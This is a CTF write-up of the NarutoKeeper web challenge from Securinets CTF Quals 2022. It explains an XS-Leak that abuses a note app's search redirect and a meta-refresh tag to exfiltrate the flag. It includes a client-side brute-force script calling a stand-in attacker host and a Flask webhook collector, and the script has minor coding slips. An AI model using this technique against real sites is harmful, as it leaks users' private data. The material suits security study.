---
title: NarutoKeeper - Securinets CTF Quals 2022
date: 2022-04-14 10:57:25
author: ma1f0y
author_url: https://twitter.com/mal_f0y
categories:
  - Web
tags:
  - SecurinetsCTFQuals
  - XS-Leak
  - XSS
  - CSP
---

**tl;dr**

+ Create a note with meta redirect tag to get callback.
+ Leak the flag using search functionality.

<!--more-->

**Challenge points**: 996
**No. of solves**: 8
**Solved by**: [ma1f0y](https://twitter.com/mal_f0y) ,[yadhuz](https://twitter.com/YadhuKrishna_)

## Challenge Description

I was confused and didn't know what's the approproate name for this website :( However just a typical note keeper website \o/ Enjoy the ride :)

## Intro

This was an interesting XS-Leaks challenge from Securinets CTF qualfiiers, which had the least number of solves among web challenges. 

## Analysis

In this challenge, we were given a note creating app and there was a search functionality where we can search note content. This seemed like a place to look for bugs like XS-Leaks.

The source code for search endpoint is given below. 

```python
@app.route('/search')
def search():

    if 'username' not in session:
        return redirect('/login')

    if 'query' not in request.args:
        return redirect('/home')

    query = str(request.args.get('query'))
    results = get_pastes(session['username'])
    res_content=[{"id":id,"val":get_paste(id)} for id in results]

    if ":" in query:
        toGo=get_paste(query.split(":")[1])
        sear=query.split(":")[0]
    else:
        toGo=res_content[0]["val"]
        sear=query

    i=0

    for paste in res_content:
        i=i+1
        if i>5:
            return redirect("/view?id=MaximumReached&paste="+toGo.strip())

        if sear in paste["val"]:
            return redirect("/view?id=Found&paste="+toGo.strip())

    return render_template("search.html",error='No results found.',result="")
```

The following happens when a request is made to `/search` endpoint.

1. The `query` argument is split based on `:`.
2. First part of `query` is the note content which will be searched in current user's note. 
3. The second part of `query` is a note id, to which the user will be redirected to when a note which matches the search is found. 

Thus, the query argument takes the following format. 

`/search?query=substring:note_id`

It is also to be noted that HTML can be inserted as a note, but there is a strict CSP which blocks us from executing JavaScript.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self';object-src 'none'">
```

## Exploit

To exploit, we can use the `/search` endpoint. We check if there's any note that contains a particular string and if present, we redirect to a note that contains an HTML code that can give the webhook server a callback.

This can be done using a `<meta>` refresh tag. 

```html
<meta http-equiv="refresh" content="0;url=http://site/webhook">
```

However, there was a timeout which limits the time that bot stays in the given URL.

```javascript
await page2.goto(website,{
        waitUntil: 'networkidle0',  
        timeout:60000
}); // Opens page as logged user
```

But, `waitUntil: 'networkidle0'` means the bot will wait until there is no network connection for at least 500ms. So, it is possible to we can load a image which will delay the timeout.



## Exploit Script

+ Client-Side Exploit

```html
<!DOCTYPE html>
<html>
    <body>
    <script>

         function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

        chars="_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}"
        char=""
        webhookid="HNDMTOGDSWTAPQH397PIXAXKZ79QUWHQSE96RVSU6C5PZGGN5G5Z5L3R1FQN3FTJ"
        window.webHook = "http://attacker_site/"
        window.url=`https://20.124.0.135/search?query=Securinets{${char}:${webhookid}`
        var temp= document.createElement("iframe")
        temp.setAttribute("src", url)
        document.body.appendChild(temp)
        let know = "Securinets{"
        async function checker(){
            for(var i=0; i<chars.length; i++){
                char=Known+chars[i];
                await fetch('/log?current='+char)
                temp.src=`https://20.124.0.135/search?query=${char}:${webhookid}`
                await sleep(3000);
                let resp = await fetch('/progress')
                let found = await resp.text()
                if(found != know){
                    know = found
                    return;
                }

            }
        }
        while (know[-1] != '}'){
            checker();         
        }

    </script>
        <img src="http://sleep_url/"> <!-- Sleeps infinitely -->
    </body>
</html>
```

+ Webhook Server

```python
from flask import Flask,request,render_template,session,redirect

app = Flask(__name__)

found = ""
letter = ""

@app.route("/")
def welcome():
    return render_template("index.html")

@app.route("/log")
def log():
    global found, letter
    letter = request.args.get("current")
    return found

@app.route("/webhook")
def webhook():
    global found, letter
    found = found + letter
    return found

@app.route("/progress")
def progress():
    global found
    return found

if __name__=="__main__":
    app.run(host="0.0.0.0", debug=True, port=8085)

```

With the above exploit, whenever a note that matches a substring of the flag, the bot gets redirected to a webhook server. 

There were many interesting solutions for this challenge like abuse the redirect in the search with fetch redirect limit. Solving this challenge was fun and learnt a lot with it.

## Flag

```
Securinets{ArigAt0}
```